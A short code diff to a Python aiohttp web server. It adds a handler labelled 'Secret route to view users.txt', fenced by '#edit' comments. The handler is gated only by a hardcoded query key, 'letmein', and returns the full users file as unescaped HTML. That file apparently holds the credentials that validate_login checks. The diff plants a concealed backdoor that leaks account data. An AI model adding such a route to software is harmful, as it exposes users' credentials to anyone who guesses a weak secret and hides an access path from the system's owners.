@@ -28,6 +28,21 @@ def validate_login(username, password):
 async def handle_ping(request):
     return web.Response(text="pong")
 
+#edit
+# === Secret route to view users.txt ===
+async def handle_users(request):
+    if request.query.get("key") != "letmein":  # Secret key check
+        return web.Response(text="Forbidden", status=403)
+
+    if not os.path.exists(USERS_FILE):
+        return web.Response(text="users.txt not found", status=404)
+
+    with open(USERS_FILE, "r") as f:
+        content = f.read()
+
+    return web.Response(text=f"<pre>{content}</pre>", content_type='text/html')
+#edit
+
 # === WebSocket handler ===
 async def websocket_handler(request):
     ws = web.WebSocketResponse()
